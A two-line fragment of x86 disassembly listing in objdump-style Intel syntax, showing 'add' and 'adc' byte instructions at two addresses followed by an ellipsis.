  412006:	add    BYTE PTR [eax],al
  412008:	adc    BYTE PTR [eax],dh
	...
